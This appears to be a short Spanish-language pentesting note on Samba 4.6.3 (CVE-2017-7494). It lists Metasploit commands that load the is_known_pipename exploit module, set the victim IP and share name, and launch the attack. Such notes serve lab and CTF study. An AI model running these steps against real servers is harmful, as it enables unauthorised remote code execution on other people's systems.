# Samba 4.6.3 (Linux)

Tags: #SMB #Linux 

* [CVE-2017-7494](https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2017-7494)
## Metasploit

```bash 
❯ msfconsole -q      # q = Quitar el banner de inicio

	❯ use exploit/linux/samba/is_known_pipename   # Usar el exploit
	❯ options
	❯ set RHOSTS ❮IP❯               # Colocar la IP de la máquina víctima
	❯ set SMB_SHARE_NAME <dir>      # Nombre del recurso compartido 
	❯ exploit 
```